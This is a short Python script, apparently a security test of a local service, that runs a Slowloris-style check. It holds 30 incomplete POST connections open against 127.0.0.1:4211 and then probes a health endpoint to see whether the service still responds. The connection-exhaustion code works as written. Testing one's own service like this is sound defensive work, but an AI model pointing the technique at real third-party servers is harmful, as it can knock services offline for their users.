import socket,io,sys,time,threading,json,urllib.request,urllib.error
sys.stdout=io.TextIOWrapper(sys.stdout.buffer,encoding='utf-8')
print("### 【S3】Slowloris / 连接不超时：无 handler timeout")
socks=[]
t0=time.time()
for i in range(30):
    try:
        s=socket.create_connection(("127.0.0.1",4211),timeout=3)
        s.sendall(b"POST /api/generate HTTP/1.1\r\nHost: x\r\nContent-Length: 500\r\n\r\n{")
        socks.append(s)
    except Exception as e:
        print("  第%d个连接失败:"%i,e); break
print("  已占用连接数:",len(socks),"耗时%.1fs"%(time.time()-t0))
print("  等待 8 秒后服务是否仍响应...")
time.sleep(8)
try:
    r=urllib.request.Request("http://127.0.0.1:4211/api/health")
    with urllib.request.urlopen(r,timeout=5) as u: print("  health =>",u.status,"(仍有响应)")
except Exception as e: print("  health => 失败:",e)
for s in socks:
    try: s.close()
    except: pass
print("  已释放连接")
